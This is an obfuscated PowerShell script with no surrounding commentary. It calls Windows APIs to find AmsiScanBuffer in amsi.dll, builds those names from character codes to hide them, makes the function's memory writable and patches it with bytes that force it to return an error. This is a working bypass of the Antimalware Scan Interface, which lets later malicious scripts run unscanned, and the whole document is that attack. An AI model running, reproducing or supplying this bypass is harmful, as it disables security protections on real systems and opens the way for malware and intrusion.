$OW7 = @"
using System;
using System.Runtime.InteropServices;
public class OW7 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr lFf6qKEjY_CSeCzzt, string i1JDSljhkr4Rm);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr yrp7V7SixMn, UIntPtr sAoC1RDoFu, uint b4kaZ8qFeS, out uint eux0Ywklv0Obm_2g2RvA);
}
"@

Add-Type $OW7

$imImNZk7W8A2jm9 = [OW7]::LoadLibrary("$([cHAR]([bYte]0x61)+[chAR]([bYTE]0x6d)+[ChaR]([BytE]0x73)+[chaR](105)+[cHAR]([ByTe]0x2e)+[chAr]([byTe]0x64)+[CHaR](36+72)+[CHar]([BYtE]0x6c))")
$EOjLaFufoPBFgE5i = [OW7]::GetProcAddress($imImNZk7W8A2jm9, "$([cHAr]([bYte]0x41)+[CHaR]([bYte]0x6d)+[CHar]([BytE]0x73)+[CHaR]([byte]0x69)+[chaR](13+70)+[ChAr](99)+[chaR]([ByTe]0x61)+[chaR](110)+[cHAR]([bYTe]0x42)+[CHAr]([byTe]0x75)+[cHar](102+90-90)+[cHar]([byTE]0x66)+[chaR](101+83-83)+[chaR]([ByTE]0x72))")
$p = 0
[OW7]::VirtualProtect($EOjLaFufoPBFgE5i, [uint32]5, 0x40, [ref]$p)
$U5w3Hwx57xpEwatBP = "0xB8"
$h6lhwy = "0x57"
$KfiE1Klz0fa = "0x00"
$W70O_TtY = "0x07"
$evIyRrIwR377dmxSj8cU = "0x80"
$t_OgeYsplWNLX66nxF = "0xC3"
$PTW2hkoDle8NXMSMhg = [Byte[]] ($U5w3Hwx57xpEwatBP,$h6lhwy,$KfiE1Klz0fa,$W70O_TtY,+$evIyRrIwR377dmxSj8cU,+$t_OgeYsplWNLX66nxF)
[System.Runtime.InteropServices.Marshal]::Copy($PTW2hkoDle8NXMSMhg, 0, $EOjLaFufoPBFgE5i, 6)